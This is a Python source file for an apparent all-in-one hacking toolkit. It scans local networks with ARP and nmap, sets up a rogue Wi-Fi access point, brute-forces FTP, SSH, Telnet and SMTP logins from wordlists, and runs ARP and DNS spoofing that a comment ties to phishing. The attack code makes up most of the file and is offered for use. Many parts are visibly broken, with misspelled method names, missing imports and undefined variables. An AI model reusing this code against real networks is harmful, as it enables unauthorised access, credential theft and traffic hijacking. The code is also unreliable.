#!/bin/python3

# Predefined modules

import nmap3
import nmap
import psutil
import re
import pwd
import random
import itertools
import subprocess
import os
import requests
import ftplib
import paramiko
import socket
import telnetlib
import smtplib
import poplib
import imaplib
import urllib
import phonenumbers
import csv
# import en_core_web_sm
import pandas as pd
import numpy as np
import json
import joblib
import pprint

from threading import Thread
from scapy.all import *
from bs4 import BeautifulSoup
from time import sleep
from collections import defaultdict
from selenium.webdriver import Chrome
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from urllib.request import *
from phonenumbers import carrier,timezone,geocoder
from scapy.all import *
from sets import *
# Created modules
# from static.modules.packages import *

# Classes
# port scanner
class SCANNER:
    def __init__(self):
        self.detail={}
        self.result=defaultdict(dict)
        self.interfaces={}
        self.iface=[]
        self.thread=[]
        self.np=nmap3.NmapScanTechniques()

    def iscan(self):
        ifaces=psutil.net_if_addrs()
        for iface in ifaces.keys():
            self.interfaces[iface]=[]
            addrs=ifaces[iface][0].address+' '
            self.interfaces[iface].append(addrs)
            self.interfaces[iface].append(addrs.replace(re.search(r'.\d* ',addrs).group(0),'.1/24'))
        self.iface=['usb0','wlan0','wlan1',True]

    # nmap scanner
    def pscan(self,ip,mac):
        self.detail.clear()
        self.result.clear()
        self.thread.clear()
        answered=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.interfaces[self.iface[1]][1]),iface=self.iface[1],timeout=1,verbose=False)[0]
        for i, ans in enumerate(answered):
            self.detail[i+1]=[ans[1].psrc,ans[1].hwsrc]
            newt=Thread(target=self.nscan,args=(ans[1].psrc,ans[1].hwsrc,i+1,))
            newt.start()
            self.thread.append(newt)
        else:
            self.detail[0]=[ip,mac]
            newt=Thread(target=self.nscan,args=(ip,mac,0,))
            newt.start()
            self.thread.append(newt)
            for t in self.thread:
                while t.is_alive(): pass

    def nscan(self,ip,mac,k):
        cinfo,pary={},{}
        osary,self.acry=[],[]
        try:
            client=self.np.nmap_tcp_scan(ip,args='-p- -A -PR')[ip]
            # print(client)
            cinfo['name']=self.handle(client['hostname'],"var[0]['name']")
            cinfo['type']=self.handle(client['hostname'],"var[0]['type']")
            cinfo['ipv4']=ip
            cinfo['mac']=mac
            for o in client['osmatch']:
                osin={}
                osin['name']=self.handle(o,"var['name']")
                osin['accuracy']=self.handle(o,"var['accuracy']")
                osin['type']=self.handle(o,"var['osclass']['type']")
                osin['osfamily']=self.handle(o,"var['osclass']['osfamily']")
                osin['cpe']=self.handle(o,"var['cpe']")
                self.acry.append(osin['accuracy'])
                osary.append(osin)
            cinfo['osmatch']=self.handle(osary,"var[self.acry.index(max(self.acry))]")
            for p in client['ports']:
                pin={}
                pin['port']=self.handle(p,"var['portid']")
                pin['name']=self.handle(p,"var['service']['name']")
                pin['product']=self.handle(p,"var['service']['product']")
                pin['version']=self.handle(p,"var['service']['version']")
                pin['reason']=self.handle(p,"var['reason']")
                pin['state']=self.handle(p,"var['state']")
                pin['extrainfo']=self.handle(p,"var['service']['extrainfo']")
                pin['cpe']=self.handle(p,"var['cpe'][0]")
                pin['scripts']=self.handle(p,"var['scripts']")
                pin['warning']=self.analyze(pin['scripts'])
                pary[len(pary)+1]=pin
            cinfo['ports']=pary
            open('static/logs/port/'+str(mac).replace(':','')+'.json','w').write(json.dumps(cinfo,indent=4))
            self.result[k]=cinfo
            try:
                jpath='static/logs/system/'+str(mac).replace(':','')+'.json'
                open(jpath,'r').read()
                self.result[k]['jpath']=jpath
            except:self.result[k]['jpath']=None
            try:
                path='static/logs/port/'+str(mac).replace(':','')+'.json'
                open(path,'r').read()
                self.result[k]['path']=path
            except:self.result[k]['path']=None
            try:
                evidence='static/logs/evidence/'+str(mac).replace(':','')+'.txt'
                open(evidence,'r').read()
                self.result[k]['evidence']=evidence
            except:self.result[k]['evidence']=None
        except Exception as e: print(e)

    def handle(self,var,val):
        try: return eval(val)
        except: return None
        
    def analyze(self,data):
        for d in data:
            if 'anonymous' in d['raw'] or len(d['raw']) > 70: return 'Warning : '+d['raw']
        else: return None

# Security script
class SECURE:
    def __init__(self,path):
        self.passwd=""

    # Secure password maker
    def passwdgen(self,ud):
        self.CHRS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.num="0123456789"
        self.sym="!@#$%^&*(){\}[]|:;'<,>.?/"
        for c in ud:
            self.CHRS=self.CHRS.replace(c,"")
            self.num=self.num.replace(c,"")
            self.sym=self.sym.replace(c,"")
        for i in range(8):
            for c in random.choices([self.CHRS,self.num,self.sym,ud]):
                self.passwd+=random.choice(c)

# Hack inbuilt                  ( Create virus or payload )
class HACKIN:
    def __init__(self,path):
        self.path=path
        self.detail={}
        self.threads=[]
        self.hashsize=defaultdict(list)
        self.hash1k=defaultdict(list)
        self.fullhash={}
        self.dup=0
        self.score=0
        self.ostype=os.name
        self.parser=[r' -c [\'|"]| -e [\'|"]|cat >.*<<.*',r'=[ a-z0-9\.\-\/\'\"_\@]+',r'[\w\-_]+=',r'\$[A-Z_]+'] # link parser, file and directory parser, Variable parser, Variable usage parser
        self.symbols=['$',';','(',')','^','|','*','.',',','+']
        self.head=['ocode','code','word_count','match_count','match_score','hack']
        self.perm={0:'---',1:'--x',2:'-w-',3:'-wx',4:'r--',5:'r-x',6:'rw-',7:'rwx'}
        self.ftype={'S_ISREG':'regular','S_ISDIR':'dir','S_ISLNK':'link','S_ISFIFO':'fifo','S_ISSOCK':'socket','S_ISCHR':'char','S_ISBLK':'block','S_ISDOOR':'door','S_ISPORT':'port','S_ISWHT':'whiteout'}
        self.ctime=ctime()
        self.dt=pd.read_csv('hcode.csv')
        self.nlp=en_core_web_sm.load()
        try: self.dt=pd.read_csv('hackcode.csv')
        except: self.hcodescrap()
        try:self.knn=joblib.load('resource/hcode.pkl')
        except:self.hackAItrain()
        self.sysinfo()

    def sysinfo(self):
        self.clscache()
        d=defaultdict(dict)
        nstat=psutil.net_if_addrs()
        for k in nstat.keys():
            d['address'][k]=nstat[k][0].address
            try: d['address']['ipv6']=nstat[k][1].address
            except: pass
        d['address']['ipv4']=requests.get('https://api.ipify.org/').text
        cpus=psutil.cpu_freq()
        d['cpu']={'min':cpus.min,'max':cpus.max,'used':cpus.current,'percentage':psutil.cpu_percent(percpu=True)}
        vmem=psutil.virtual_memory()
        d['ram']={'perentage':'{:.1f} %'.format(vmem.percent),'total':self.bytes(vmem.total),'available':self.bytes(vmem.available),'used':self.bytes(vmem.used),'free':self.bytes(vmem.free)}
        bat=psutil.sensors_battery()
        d['battery']={'percentage':'{:.1f} %'.format(bat.percent),'time':self.secs(bat.secsleft),'pluged':bat.power_plugged}
        for ds in psutil.disk_partitions():
            dsu=psutil.disk_usage(ds.mountpoint)
            newt=Thread(target=self.fparse,args=(ds.mountpoint,))
            newt.start()
            self.threads.append(newt)
            d['storage'][ds.device]={'mount':ds.mountpoint,'fstype':ds.fstype,'total':self.bytes(dsu.total),'used':self.bytes(dsu.used),'free':self.bytes(dsu.free),'percentage':'{:.1f} %'.format(dsu.percent)}
        for pid in psutil.pids():
            inf=psutil.Process(pid).as_dict()
            d['process'][pid]={'name':inf['name'],'status':inf['status'],'user':inf['username'],'cpu':'{:.1f} %'.format(inf['cpu_percent']),'memory':'{:.1f} %'.format(inf['memory_percent']),'cwd':inf['cwd'],'threads':inf['num_threads'],'connections':[[cn.laddr,cn.raddr] for cn in inf['connections']]}
            # 'cmdline', 'connections', 'cpu_affinity', 'cpu_num', 'cpu_percent', 'cpu_times', 'create_time', 'cwd', 'environ', 'exe', 'gids', 'io_counters', 'ionice', 'memory_full_info', 'memory_info', 'memory_maps', 'memory_percent', 'name', 'nice', 'num_ctx_switches', 'num_fds', 'num_handles', 'num_threads', 'open_files', 'pid', 'ppid', 'status', 'terminal', 'threads', 'uids', 'username'
        self.detail=d

    def clscache(self):
        if self.ostype=="posix":
            os.system("sudo sh -c 'sync; echo 3 > /proc/sys/vm/drop_caches'")
            os.system("sudo find /tmp -type f -atime +5 -delete")
            os.system("sudo apt autoremove")
            os.system("sudo apt autoclean")
        elif self.ostype == "nt":
            os.system("ipconfig/flushDNS")
            os.system("del /q/f/s %\TEMP%\*")
        else:pass

    def fparse(self,path):
        sysfile=defaultdict(dict)
        for r,d,f, in os.walk(path):
            for fname in f:
                fpath=os.path.join(r,fname)
                if os.path.splitext(fname)[1] == '.log' and 'history' in fpath: 
                    self.detail['log']={fpath:[]}
                try:
                    fpath=os.path.realpath(fpath)
                    Thread(targget=self.fsystem,args=(fpath)).start()
                    sysfile[fpath]=self.fsystem(fpath)
                    fsize=os.path.getsize(fpath)
                    self.hashsize[fsize].append(fpath)
                except Exception as e: pass

    def chkdup(self):
        for sizeb,files in self.hashsize.items():
            if len(files)<2: pass
            else:
                for fname in files:
                    print(fname)
                    try:
                        shash=self.gethash(fname,first_chunk_only=True)
                        self.hash1k[(shash,sizeb)].append(fname)
                    except: pass
        for __,flist in self.hash1k.items():
            if len(flist) < 2: pass
            else:
                for fname in flist:
                    print(fname)
                    try:
                        fhash=self.gethash(fname,first_chunk_only=False)
                        duplicate=self.fullhash.get(fhash)
                        if duplicate: 
                            self.dup+=1
                            print("Duplicate found {} and {}".format(fname,duplicate))
                        else: self.fullhash[fhash]=fname
                    except: pass

    def gethash(self,fname,first_chunk_only=False,hash=hashlib.sha1):
        hashobj=hash()
        fobj=open(fname,'rb')
        if first_chunk_only: hashobj.update(fobj.read(1024))
        else:
            for chunk in self.chkread(fobj): hashobj.update(chunk)
        hashed=hashobj.digest()
        fobj.close()
        return hashed

    def chkread(self,fobj,chunk_size=1024):
        while True:
            chunk=fobj.read(chunk_size)
            if not chunk: return
            yield chunk

    def fsystem(self,fname):
        f={}
        stat=os.stat(fname)
        f['permission'],f['type']=self.pmode(stat.st_mode)
        f['size']=[stat.st_size,self.bytes(stat.st_size)]
        f['last_acess_time']=self.secs(stat.st_atime)
        f['last_modification_time']=self.secs(stat.st_mtime)
        f['current_time']=self.secs(stat.st_ctime)
        f['user']=pwd.getpwuid(stat.st_uid).pw_name
        f['group']=pwd.getpwuid(stat.st_gid).pw_name
        f['hard_disk_count']=stat.st_nlink
        f['hack_code']=[]
        try:
            fcont=str(open(fname,'rb').read()).replace('\n','')
            for p in dt['code']:f['hack_code'].append(re.findall(p,fcont,re.DOTALL))
        except:pass
        f['analysis']=None
        self.detail['files'][fname]=f

    def pmode(self,ch):
        t=""
        for k,chk in self.ftype.items():
            if eval('stat.'+k+'('+str(ch)+')'): t=chk
        p=oct(ch)[-3:]
        return self.perm[int(p[0])]+self.perm[int(p[1])]+self.perm[int(p[2])],t

    def log(self):
        if self.ostype == 'posix':
            for k,_ in self.detail['log'].items():
                self.detail['log'][k]=subprocess.check_output("cat "+k,shell=True).decode().split("\n")
        elif self.ostype == 'nt': pass

    def hcodeset(self):
        code=[]
        mcode=0
        soup=BeautifulSoup(requests.get('https://gtfobins.github.io/').content,'html5lib')
        for url in ['https://gtfobins.github.io'+a['href'] for a in soup.findAll('a') if '/gtfobins/' in a['href'] and '#' not in a['href']]:
            suop1=BeautifulSoup(requests.get(url).content,'html5lib')
            for sd in suop1.findAll('pre'):
                data=sd.text.split('\n')
                for i,d in enumerate(data):
                    for rp in re.findall(r'\w*attacker[\\]share\w*',d):d=d.replace(rp,'file_to_share')
                    if re.findall(parser[0],d):
                        code.append([''.join(data[i:]).replace('# press return twicereset','').replace('\\','/'),1])
                        break
                    else: code.append([d.replace('\\','/'),1])
        with open('hcode.csv','w',newline='') as file:
            w=csv.writer(file)
            w.writerow(self.head)
            for d in code:
                l=0
                md=d[0].replace('[','').replace(']','').replace('<file name>','file_to_lp').replace('username','file_to_name').strip()
                if md in ['','^']: pass
                else:
                    x=re.findall(r'http\w:[\w\.\/\?\=\&\%]+',md)
                    if x:
                        for rp in x:md=md.replace(rp,'http\w:[\w\.\/\?\=\&\%]+')
                    else:
                        for s in self.symbols:md=md.replace(s,'\\'+s)
                    for p in parser:
                        match=re.findall(p,md)
                        if match:
                            l+=len(match)
                            for rp in match:md=md.replace(rp,str(p))
                        match1=re.findall(r'file_to_\w*|output_file|where_to\w*',md)
                        if match1:
                            l+=len(match1)
                            for rp in match1:md=md.replace(rp,'[\w\-_\/]+')
                        md=md.replace('\\\\','\\').replace('\[','[').strip()
                        data=[d[0],md,len(d[0].split('')),l,self.matcher(d[0].replace('[','').replace(']',''),md)]
                        if re.findall(r'\w*pass\w*|\w*/bin/\w*| sh |\w*shadow\w*|\w*bash\w*',md):
                            if re.findall(md.strip(),d[0].replace('[','').replace(']','')):mcode+=1
                            print([d[0].replace('[','').replace(']',''),mcode,len(code),l,md],'\n\n\n\n\n')
                            w.writerow(data)
                        else:
                            if d[1] != 0:
                                if re.findall(md.strip(),d[0].replace('[','').replace(']','')):mcode+=1
                                print([d[0].replace('[','').replace(']',''),mcode,len(code),l,md],'\n\n\n\n\n')
                                w.writerow(data)

    def matcher(self,str1,str2):
        size_x=len(str1)+1
        size_y=len(str2)+1
        m=np.zeros((size_x,size_y))
        for x in range(size_x):m[x,0]=x
        for y in range(size_y):m[0,y]=y
        for x in range(1,size_x):
            for y in range(1,size_y):
                if str1[x-1]==str2[y-1]:m[x,y]=m[x-1,y-1]
                else:m[x,y]=min(m[x-1,y]+1,m[x-1,y-1],m[x,y-1]+1)
        return (m[size_x-1,size_y-1]/size_x)

    # link with fsystem function but create dataset hacking code with file permission
    def hackAI(self,data):pass

    # common functions
    def bytes(self,size):
        for s in ['bytes','KB','MB','GB','TB']:
            if size < 1024.0:
                return '{:3.1f} {:s}'.format(size,s)
            size/=1024.0

    def secs(self,sec):
        mm,ss=divmod(sec,60)
        hh,mm=divmod(mm,60)
        return '{:d}:{:2d}:{:2d}'.format(hh,mm,ss)

# Hack through wireless         ( Add backdoor listener, WIFI crack, DDOS attack )
class HACKOUT:
    def __init__(self,drange,ssid,passwd):
        # Main variable
        self.CHRS="abcdefghijklmnopqrstuvwxyz"
        self.num="0123456789"
        self.sym="!@#$%^&*(){\}[]|:;'<,>.?/"
        self.path='wordlists'
        self.smedia=['facebook.com','twitter.com','linkedin.com','instagram.com','youtube.com','github.com']
        self.about=['/about_overview','/about_work_and_education','/about_places','/about_contact_and_basic_info','/about_family_and_relationships','/about_details','/about_life_events']
        self.wdriver=r'resource/chromedriver'
        self.thread=[]
        self.iface=[]
        self.interfaces={}
        self.detail={}
        self.dnshosts={}
        self.links=[]
        # AP enable
        self.host='hostapd.conf'
        self.dns='dnsmacq.conf'
        self.dinit=drange.split('.')[-1]
        self.drange='{}2,{},255.255.255.0,{}h'.format(drange.replace(dinit,''),drange,time)
        self.ssid=ssid
        self.passwd=passwd
        # Fake wifi and signal cpature
        self.THRESH=6
        self.ssiddict={}
        self.ssidcnt={}
        self.crun=True
        self.clientinfo=defaultdict(dict)

        # Intialize
        self.np3=nmap3.NmapScanTechniques()
        self.options=Options()
        self.options.add_argument('--disable-notifications')
        self.options.add_argument('--no-sandbox')
        self.options.add_argument('--headless')

    # Interface scan
    def iscan(self):
        ifaces=psutil.net_if_addrs()
        for iface in ifaces.keys():
            self.interfaces[iface]=[]
            addrs=ifaces[iface][0].address+' '
            self.interfaces[iface].append(addrs)
            self.interfaces[iface].append(addrs.replace(re.search(r'.\d* ',addrs).group(0),'.1/24'))
        self.iface=['usb0','wlan0','wlan1',True]

    # Initiate hacking
    # WIFI signal scanner
    def wifiscan(self):
        Thread(target=self.change_channel).start()
        self.detail['Dot11'].clear()
        sniff(iface=self.iface[2],prn=self.scan,timeout=5)

    def wscan(self,p):
        wifi={}
        if p.haslayer(Dot11):
            try:
                typ,subtype=p[Dot11].type,p[Dot11].subtype
                if typ==0:
                    # if subtype==4: wifi['clients']=p[Dot11].addr2 # client request wasted
                    if subtype==8 or subtype==5: # Beacon frame and client response
                        clt=p[Dot11].addr1
                        wifi['bssid']=p[Dot11].addr2
                        wifi['ssid']=p[Dot11Elt].info.decode()
                        if '\x00' in wifi['ssid']: wifi['ssid']='Hidden Access Point'
                        try: wifi['dbm_signal']=str(p.dBm_AntSignal)+' dbm'
                        except: wifi['dbm_signal']='N/A'
                        stats=p[Dot11Beacon].network_stats()
                        wifi['channel']=stats.get('channel')
                        wifi['crypto']=[s for s in stats.get('crypto')][0]
                        wifi['rates']=str(stats.get('rates')[0])+' Mbps'
                        if clt not in ['ff:ff:ff:ff:ff:ff','00:00:00:00:00:00',wifi['bssid']]: wifi['clients']=clt
                    if subtype==11: wifi['bssid'],wifi['clients']=p[Dot11].addr2,p[Dot11].addr1 # Authendication of client
                    if subtype==12: wifi['deauth'],wifi['clients']='Deauthendication detected of client ',p[Dot11].addr1 # Deauthendication of client
                if typ==1 and subtype==11: wifi['bssid'],wifi['clients']=p[Dot11].addr2,p[Dot11].addr1
                if typ==2 and len(self.detail['Dot11']): # new connection
                    addr1,addr2,addr3=p[Dot11].addr1,p[Dot11].addr2,p[Dot11].addr3
                    if subtype==0 and addr2 != addr3: wifi['bssid'],wifi['clients']=addr2,addr3
                    if subtype==8: wifi['bssid'],wifi['clients'],wifi['eapol']=addr1,addr2,p
                    if subtype==12: wifi['bssid'],wifi['clients']=addr1,addr2
                wifi['info']=self.fakeap(p)
                try:
                    if wifi['clients'] not in self.detail['Dot11'][wifi['bssid']]['clients']: self.detail['Dot11'][wifi['bssid']]['clients'].append(wifi['clients'])
                except:
                    if wifi['bssid'] not in self.detail['Dot11'].keys() and len(wifi)>2: wifi['clients'],self.detail['Dot11'][wifi['bssid']]=[],wifi
            except: pass

    def change_channel(self):
        ch=1
        while self.crun:
            try:
                os.system('iwconfig '+self.iface[2]+' channel '+str(ch))
                ch=(ch%14)+1
                sleep(0.5)
            except KeyboardInterrupt: break

    # Fake AP detection
    def fakeap(self,p):
        if p.getlayer(Dot11).subtype==80:
            ssid=p[Dot11].info.decode()
            bssid=p[Dot11].addr2
            stamp=str(p[Dot11].timestamp)
            if bssid not in self.ssiddict:
                self.ssiddict[bssid]=[]
                self.ssidcnt[bssid]=0
            elif(long(stamp)<long(self.ssiddict[bssid][-1])):self.ssidcnt[bssid]+=1
            if(self.ssidcnt[bssid]>self.THRESH): return self.ssiddict[bssid].append(stamp)
        return None

    # Initiate hacking with dns establish
    def apstart(self):
        os.system('ifconfig '+self.iface[1]+' up 192.168.28.1 netmask 255.255.255.0')
        os.system('route add -net 192.168.28.0 netmask 255.255.255.0 gw 192.168.28.1')
        os.system('iptables --table nat --append POSTROUTING --out-interface '+self.iface[0]+' -j MASQUERADE')
        os.system('iptables --append FORWARD --in-interface '+self.iface[1]+' -j ACCEPT')
        os.system('echo 1 > /proc/sys/net/ipv4/conf/all/proxy_arp')
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        #create hostapd.conf
        self.confedit(self.host,'interface',self.iafce[1])
        self.confeidt(self.host,'ssid',self.ssid)
        self.confedit(self.host,'wpa_passphrase',self.password)
        #create dnsmasq.conf
        self.confedit(self.dns,'interface',self.iface[1])
        self.confedit(self.dns,'dhcp-range',self.drange)
        subprocess.Popen('dnsmasq -C static/APconf/dnsmasq.conf -d',shell=True)
        self.map=subprocess.Popen('hostapd static/APconf/hostapd.conf',shell=True)
        while self.map.poll() is None: pass
        self.apstop()

    def confedit(self,file,var,val):
        temp=[]
        with open('static/APconf/'+file,'r') as fp:
            for cont in fp.readlines():
                if var in cont and var not in '_ssid':temp.append(cont.replace(cont,var+'='+val+'\n'))
                else:temp.append(cont)
        open('static/APconf/'+file,'w').write(''.join(temp))

    def apstop(self):
        os.system('iptables -F')
        os.system('echo 0 > /proc/sys/net/ipv4/conf/all/proxy_arp')
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

    # Start hacking
    # ARP scanner
    def pscan(self,ip,mac):
        self.ip,self.mac=ip,mac
        self.arpd.clear()
        self.nmapd.clear()
        self.thread.clear()
        answered=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.interfaces[self.iface[1]][1]),iface=self.iface[1],timeout=1,verbose=False)[0]
        for i, ans in enumerate(answered):
            self.detail[i+1]['arp']=[ans[1].psrc,ans[1].hwsrc]
            newt=Thread(target=self.nscan3,args=(ans[1].psrc,ans[1].hwsrc,i+1,))
            newt.start()
            self.thread.append(newt)
        else:
            self.detail[0]['arp']=[ip,mac]
            newt=Thread(target=self.nscan3,args=(ip,mac,0,))
            newt.start()
            self.thread.append(newt)
            for t in self.thread:
                while t.is_alive(): pass
    
    # Nmap3 scan
    def nscan3(self,ip,mac,k):
        print(ip,mac)
        self.detail[k]=defaultdict(dict)
        try:self.detail[k]['jpath']='static/logs/system/'+str(self.mac).replace(':','')+'.json'
        except Exception as e: self.detail[k]['jpath']=None
        try:self.detail[k]['path']='static/logs/port/'+str(self.mac).replace(':','')+'.json'
        except Exception as e: self.detail[k]['path']=None
        try:self.detail[k]['evidence']=open('static/logs/evidence/'+str(self.mac).replace(':','')+'.txt')
        except:self.detail[k]['evidence']=None
        cinfo,pary={},{}
        osary,self.acry=[],[]
        try:
            client=self.np3.nmap_tcp_scan(ip,args='-p- -A -Pn')[ip]
            # print(client)
            cinfo['name']=self.handle(client['hostname'],"var[0]['name']")
            cinfo['type']=self.handle(client['hostname'],"var[0]['type']")
            cinfo['ipv4']=ip
            cinfo['mac']=mac
            for o in client['osmatch']:
                osin={}
                osin['name']=self.handle(o,"var['name']")
                osin['accuracy']=self.handle(o,"var['accuracy']")
                osin['type']=self.handle(o,"var['osclass']['type']")
                osin['osfamily']=self.handle(o,"var['osclass']['osfamily']")
                osin['cpe']=self.handle(o,"var['cpe']")
                self.acry.append(osin['accuracy'])
                osary.append(osin)
            cinfo['osmatch']=self.handle(osary,"var[self.acry.index(max(self.acry))]")
            for p in client['ports']:
                pin={}
                pin['port']=self.handle(p,"var['portid']")
                pin['name']=self.handle(p,"var['service']['name']")
                pin['product']=self.handle(p,"var['service']['product']")
                pin['version']=self.handle(p,"var['service']['version']")
                pin['reason']=self.handle(p,"var['reason']")
                pin['state']=self.handle(p,"var['state']")
                pin['extrainfo']=self.handle(p,"var['service']['extrainfo']")
                pin['cpe']=self.handle(p,"var['cpe'][0]")
                pin['scripts']=self.handle(p,"var['scripts']")
                pin['warning']=self.analyze(pin['scripts'])
                pary[len(pary)+1]=pin
            cinfo['ports']=pary
            newt=Thread(target=self.hackanalyze,args=(cinfo,k,))
            newt.start()
            self.thread.append(newt)
            self.detail[k]=cinfo
            open('static/logs/port/'+str(self.mac).replace(':','')+'.json','w').write(json.dumps(cinfo,indent=4))
            print('writed',self.detail)
        except Exception as e: print(e)

    # Script analysis
    def anlyze(self,data):
        for d in data:
            if 'anonymous' in d['raw'] or len(d['raw']) > 70: return 'Warning : '+d['raw'] 
        else: return None

    # Hack analysis
    def hackanalyze(self,info,k):
        for port in info['ports']:
            if port['name'] in ['ftp']: 
                newt=Thread(target=self.hackftp,args=(info['ipv4'],port['port'],k,))
                newt.start()
                self.thread.append(newt)
            elif port['name'] in ['ssh']:
                newt=Thread(target=self.hackssh,args=(info['ipv4'],port['port'],k,))
                newt.start()
                self.thread.append(newt)
            elif port['name'] in ['telnet']:
                newt=Thread(target=self.hacktelnet,args=(info['ipv4'],port['port'],k,))
                newt.start()
                self.thread.append(newt)
            elif port['name'] in ['smtp']:
                newt=Thread(target=self.hacksmtp,args=(info['ipv4'],port['port'],k,))
                newt.start()
                self.thread.append(newt)
            elif port['name'] in ['dns']:
                newt=Thread(target=self.psniff,args=(info['ipv4'],k,))# Packet analysis
                newt.start()
                self.thread.append(newt)
                # newt=Thread(target=self.hackdns,args=(info['ipv4'],port['mac'],k,))
                # newt.start()
                # self.thread.append(newt)
            elif port['name'] in ['http','https']:
                newt=Thread(target=self.hackweb,args=(info['ipv4'],port['port'],k,))
                newt.start()
                self.thread.append(newt)
            else: pass

    # FTP hack 21
    def hackftp(self,ip,port,k):
        ftp=ftplib.FTP()
        ftp.connect(ip,port)
        for user,passwd in self.wordlist(self.arg):
            try:
                ftp.login(user,passwd)
                self.detail[k]['ftp']={'user':user,'passwd':passwd}
                self.detail[k]['ftp']['data']:self.getftp(ftp,[0])
                self.detail[k]['ftp']['paths']=[]
                self.parseftp(ftp,k)
            except ftplib.error_perm: pass
        ftp.close()

    def parseftp(self,ftp,k):
        for f in ftp.nlst():
            try: ftp.cwd(f),self.parseftp(ftp,k)
            except: self.detail[k]['ftp']['paths'].append(ftp.pwd()+f)

    def getftp(self,ftp,t):
        if t[0]==0: return ftp.dir() # list directory
        elif t[0]==1: return ftp.pwd() # get current directory
        elif t[0]==2: return ftp.cwd(t[1]) # change directory
        elif t[0]==3: return ftp.size(t[1]) # get size of file
        elif t[0]==4: return ftp.retrbinary("RETR "+t[1],open(t[1],'wb').write) # get file from ftp
        elif t[0]==5: return ftp.storbinary("STOR "+t[1],open(t[1],'rb')) # store file to ftp
        else: ftp.sendcmd(t[0])

    # SSH hack 22
    def hackssh(self,ip,port,k):
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        rsakey="" # changes required
        if rsakey is not None:
            try:
                k=paramiko.RSAKey.from_private_key_file(rsakey) 
                ssh.connect(hostname=ip,port=port,key_filename=k,look_for_keys=True,timeout=5000)
                self.detail[k]['ssh']['data']=ssh.exec_command('ls -alrt')
                self.detail[k]['ssh']['paths']=[]
                self.parsessh(ssh,k)
            except paramiko.AuthenticationException: pass
        else:
            for user,passwd in self.wordlist(self.arg):
                try:
                    ssh.connect(hostname=ip,port=port,password=passwd,username=user,timeout=5000)
                    self.detail[k]['ssh']={'user':user,'passwd':passwd}
                    self.detail[k]['ssh']['data']=ssh.exec_command('ls -alrt')
                    self.detail[k]['ssh']['paths']=[]
                    self.parsessh(ssh,k)
                except paramiko.AuthenticationException: pass
        ssh.close()
    
    def parsessh(self,ssh,k):
        for f in ssh.exec_command('ls'):
            try: ssh.exec_command('cd '+f),self.parsessh(ssh,k)
            except: self.detail[k]['ssh']['paths'].append(ssh.exec_command('pwd')+f)

    # Telnet hack 23
    def hacktelnet(self,ip,port,k):
        telnet=telnetlib.Telnet(port+':'+str(port))
        telnet.read_until('login: ')
        for user,passwd in self.wordlist(self.arg):
            try:
                telnet.write(user+'\n')
                telnet.write(passwd+'\n')
                self.detail[k]['telnet']={'user':user,'passwd':passwd}
                self.detail[k]['telnet']['data']=self.gettnt(telnet,'ls')
                self.detail[k]['telnet']['paths']=[]
                self.parsetnt(telnet,k)
            except: pass
        telnet.write('exit\n')

    def getnt(self,telnet,cmd):
        telnet.write(cmd+'\n')
        return telnet.read_all().decode()

    def parsetnt(self,telnet,k):
        for f in self.gettnt(telnet,'ls\n'):
            try: self.gettnt(telnet,'cd '+f+'\n'),self.parsetnt(telnet,k)
            except: self.detail[k]['telnet']['paths'].append(self.gettnt(telnet,'pwd'+f+'\n'))

    # SMTP hack 25
    def hacksmtp(self,ip,port,k):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        for user,_ in self.wordlist(self.arg):
            if s.send('VRFY '+user+'\r\n') in ['250','252']: self.detail[k]['smtp']={'user':user}
        s.close()
        smtp=smtplib.SMTP(ip,port)
        smtp.ehlo()
        smtp.starttls()
        for _,passwd in self.wordlist(self.arg):
            try:
                smtp.login(self.detail[k]['smtp']['user'],passwd)
                self.detail[k]['smtp']['passwd']=passwd
            except smtplib.SMTPAuthenticationErsmtp: pass
        smtp.quit()

    # DNS hack 53
    def hackdns(self,ip,mac,k):
        newt=Thread(target=self.arpspoof,args=(ip,))
        newt.start()
        self.thread.append(newt)
        self.dnssppof(ip,k) # DNS spoof attack for phishising

    # DNS arpspoof
    def arpspoof(self,ip,mac):
        pcount=0
        try:
            os.system('sysctl net.ipv4.ip_forward=1')
            while True:
                self.sendp(ip,mac,self.ip,self.mac)
                self.sendp(self.ip,self.mac,ip,mac)
                pcount+=2
                time.sleep(1)
        except: pass

    def sendp(self,tip,tmac,ip,mac):
        p=ARP(pdst=tip,hwdst=tmac,op=2,psrc=ip)
        send(p,verbose=False)

    # Gather information form packets
    def psniff(self,ip,k):
        self.detail[k]['http']={}
        self.detail[k]['dns']=[]
        sniff(iface=self.iface[1],prn=self.pktscan)

    def pktscan(self,p):
        # HTTP request analysis
        if p.haslayer(http.HTTPRequest):self.detail['purls']={str(p[http.HTTPRequest].HOST+p[http.HTTPRequest].Path):str(self.handle(p,'var[Raw].load'))}
        # DNS analysis
        if p.haslayer(DNSRR):self.detail['pdns'][str(p[IP].src)+'-'+str(p[IP].dst)].append(p[DNSQR].qname)

    # DNS dnsspoof
    def dnssppof(self,ip,k):
        QUEUE_NUM=0
        os.system('iptables -I FORWARD -j NFQUEUE --queu-num {}'.format(QUEUE_NUM))
        queue=NetfilterQueue()
        queue.bind(QUEUE_NUM,self.pprocess)
        try: queue.run()
        except KeyboardInterrupt: os.system('iptables --flush')

    def pprocess(self,p):
        spacket=IP(p.get_payload())
        if spacket.haslayer(DNSRR):
            try: spacket=self.mpacket(spacket)
            except IndexError: pass
            p.set_payload(bytes(spacket))
        p.accept()

    def mpacket(self,p):
        qname=p[DNSQR].qname
        if qname not in self.dnshosts: return p
        p[DNS].an=DNSRR(rrname=qname,rdata=self.dnshosts[qname])
        p[DNS].account=1
        del p[IP].len
        del p[IP].chksum
        del p[UDP].length
        del p[UDP].chksum
        return p

    # http,https hack 80,443 https://hackernoon.com/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824
    def hackewb(self,ip,port,k):
        newt=Thread(target=self.dirscan,args=(ip,k,))
        newt.start()
        self.thread.append(newt)
        self.detail[k]['web']={'robots.txt':self.error("requests.get(ip+'/robots.txt')")}
        self.detail[k]['web']['sitemap.xml']=self.error("requests.get(ip+'/sitemap.xml')")
